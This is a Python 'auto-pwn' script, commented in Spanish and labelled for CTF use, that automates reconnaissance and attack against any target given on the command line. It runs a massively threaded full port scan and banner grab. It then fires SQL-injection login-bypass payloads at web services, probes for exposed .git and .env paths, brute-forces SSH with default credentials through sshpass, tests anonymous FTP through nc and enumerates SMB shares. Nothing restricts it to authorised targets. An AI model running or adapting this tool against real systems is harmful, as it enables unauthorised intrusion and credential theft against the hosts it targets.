#!/usr/bin/env python3
"""
AUTO-PWN FRAMEWORK - VELOCIDAD MÁXIMA CTF
Automatización completa para reconocimiento y explotación
"""

import os
import sys
import subprocess
import threading
import time
import socket
import requests
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import argparse

class CTFAutoPwn:
    def __init__(self, target):
        self.target = target
        self.open_ports = []
        self.services = {}
        self.vulnerabilities = []
        
    def banner(self):
        print("""
╔═══════════════════════════════════════════╗
║         AUTO-PWN CTF FRAMEWORK            ║
║         VELOCIDAD MÁXIMA ACTIVADA         ║
╚═══════════════════════════════════════════╝
        """)
        
    def fast_port_scan(self):
        """Escaneo ultrarrápido de puertos"""
        print(f"[*] Escaneando {self.target}...")
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.target, port))
                sock.close()
                if result == 0:
                    return port
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=1000) as executor:
            results = executor.map(scan_port, range(1, 65536))
            
        self.open_ports = [p for p in results if p is not None]
        print(f"[+] Puertos abiertos: {self.open_ports}")
        return self.open_ports
    
    def identify_services(self):
        """Identificación rápida de servicios"""
        print("[*] Identificando servicios...")
        
        for port in self.open_ports:
            try:
                # Banner grabbing
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, port))
                sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                sock.close()
                
                # Identificar servicio
                if 'HTTP' in banner or port in [80, 443, 8080, 8443]:
                    self.services[port] = 'http'
                elif 'SSH' in banner or port == 22:
                    self.services[port] = 'ssh'
                elif 'FTP' in banner or port == 21:
                    self.services[port] = 'ftp'
                elif port == 3306:
                    self.services[port] = 'mysql'
                elif port == 5432:
                    self.services[port] = 'postgresql'
                elif port == 445:
                    self.services[port] = 'smb'
                elif port == 3389:
                    self.services[port] = 'rdp'
                else:
                    self.services[port] = 'unknown'
                    
                print(f"[+] Puerto {port}: {self.services[port]}")
            except:
                self.services[port] = 'unknown'
    
    def auto_exploit(self):
        """Explotación automática basada en servicios detectados"""
        print("[*] Iniciando explotación automática...")
        
        exploits = []
        
        for port, service in self.services.items():
            if service == 'http':
                exploits.append(threading.Thread(target=self.exploit_web, args=(port,)))
            elif service == 'ssh':
                exploits.append(threading.Thread(target=self.exploit_ssh, args=(port,)))
            elif service == 'ftp':
                exploits.append(threading.Thread(target=self.exploit_ftp, args=(port,)))
            elif service == 'smb':
                exploits.append(threading.Thread(target=self.exploit_smb, args=(port,)))
        
        # Ejecutar todos los exploits en paralelo
        for exploit in exploits:
            exploit.start()
        
        for exploit in exploits:
            exploit.join()
    
    def exploit_web(self, port):
        """Explotación web automática"""
        url = f"http://{self.target}:{port}"
        print(f"[*] Atacando servicio web en {url}")
        
        # Intentar inyección SQL básica
        payloads = ["' OR '1'='1", "admin' --", "' OR 1=1--", "\" OR 1=1--"]
        for payload in payloads:
            try:
                r = requests.get(f"{url}/login?username={payload}&password=test", timeout=2)
                if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                    print(f"[!!!] POSIBLE SQL INJECTION en {url}")
                    self.vulnerabilities.append(f"SQL Injection en {url}")
            except:
                pass
        
        # Buscar directorios sensibles
        dirs = ['.git', 'admin', 'backup', '.env', 'config', 'api', 'upload']
        for d in dirs:
            try:
                r = requests.get(f"{url}/{d}", timeout=1)
                if r.status_code == 200:
                    print(f"[!] Directorio encontrado: {url}/{d}")
            except:
                pass
    
    def exploit_ssh(self, port):
        """Fuerza bruta SSH"""
        print(f"[*] Intentando fuerza bruta SSH en puerto {port}")
        users = ['root', 'admin', 'user', 'test', 'ubuntu']
        passwords = ['password', 'admin', '123456', 'root', 'toor']
        
        for user in users:
            for password in passwords:
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {user}@{self.target} 'echo SUCCESS'"
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
                    if 'SUCCESS' in result.stdout.decode():
                        print(f"[!!!] CREDENCIALES SSH ENCONTRADAS: {user}:{password}")
                        self.vulnerabilities.append(f"SSH weak creds: {user}:{password}")
                        return
                except:
                    pass
    
    def exploit_ftp(self, port):
        """Explotación FTP"""
        print(f"[*] Probando FTP anónimo en puerto {port}")
        try:
            cmd = f"echo -e 'USER anonymous\\nPASS test@test.com\\nLIST\\nQUIT' | nc {self.target} {port}"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
            if '230' in result.stdout.decode():
                print(f"[!!!] FTP ANÓNIMO HABILITADO en puerto {port}")
                self.vulnerabilities.append(f"Anonymous FTP on port {port}")
        except:
            pass
    
    def exploit_smb(self, port):
        """Explotación SMB"""
        print(f"[*] Enumerando SMB en puerto {port}")
        try:
            cmd = f"smbclient -L {self.target} -N"
            subprocess.run(cmd, shell=True, timeout=3)
        except:
            pass
    
    def run(self):
        """Ejecutar todo el framework"""
        self.banner()
        start_time = time.time()
        
        # Fase 1: Reconocimiento
        self.fast_port_scan()
        self.identify_services()
        
        # Fase 2: Explotación
        self.auto_exploit()
        
        # Resultados
        elapsed = time.time() - start_time
        print(f"\n[✓] ESCANEO COMPLETADO EN {elapsed:.2f} SEGUNDOS")
        print(f"[✓] Vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"    - {vuln}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='AUTO-PWN CTF Framework')
    parser.add_argument('target', help='IP o dominio objetivo')
    args = parser.parse_args()
    
    pwn = CTFAutoPwn(args.target)
    pwn.run()